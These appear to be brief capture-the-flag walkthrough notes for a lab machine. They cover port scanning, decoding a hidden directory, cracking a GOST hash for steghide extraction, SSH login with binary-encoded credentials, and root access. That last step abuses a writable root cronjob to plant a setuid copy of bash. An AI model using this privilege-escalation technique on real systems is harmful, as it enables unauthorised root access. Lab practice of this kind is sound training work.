kral4-PC
 
80 nginx 1.16.1  
6498 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  
65524 Apache httpd 2.4.43
 
go to IP:65524  
find flag 3 in source code  
find hidden directory in base62  
/n0th1ng3ls3m4tt3r
 
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81  
GOST hash  
pass: mypasswordforthatjob  
use this passworde to extract data from jpg from above directory
 
steghide extract -sf image.jpg
 
username:boring  
password:  
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
 
boring:iconvertedmypasswordtobinary  
ssh
 
decode user flag with rot13  
flag{n0wits33msn0rm4l}
 
enum flag in /var/www/html/hidden/whatever/index.html  
base64
 
in robots.txt file, find an md5 hash, use [https://md5hashing.net](https://md5hashing.net) to crack
 
find cronjob in /etc/crontab that has hidden shell script you can write to, but is run by root  
nano script  
''  
cp /bin/bash /tmp/bash  
chmod +xs /tmp/bash  
''
 
after one minute, go to /tmp and ./bash -p
 
/root/.root.txt  
flag{63a9f0ea7bb98050796b649e85481845}
 
LL:  
GOST hash  
using website to crack md5 hash  
exploit writable cronjob owned by root